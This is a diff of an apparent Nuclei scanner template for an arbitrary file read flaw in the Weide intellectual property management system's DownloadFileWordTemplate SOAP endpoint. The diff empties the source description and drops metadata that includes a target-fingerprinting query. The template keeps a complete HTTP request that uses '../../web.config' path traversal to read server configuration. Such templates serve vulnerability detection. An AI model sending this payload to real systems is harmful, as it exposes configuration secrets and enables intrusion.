@@ -3,12 +3,8 @@ info:
   name: 唯徳知识产权产权系统DownloadFileWordTemplate存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/adg8a7k2p26mrluc'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: adg8a7k2p26mrluc
-    fofa: body="/Scripts/JSCOMM/Box.js"
 http:
 - raw:
   - "POST /AutoUpdate/WSFM.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/DownloadFileWordTemplate\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <DownloadFileWordTemplate xmlns=\"http://tempuri.org/\">\n      <fileName>../../web.config</fileName>\n    </DownloadFileWordTemplate>\n  </soap:Body>\n</soap:Envelope>"
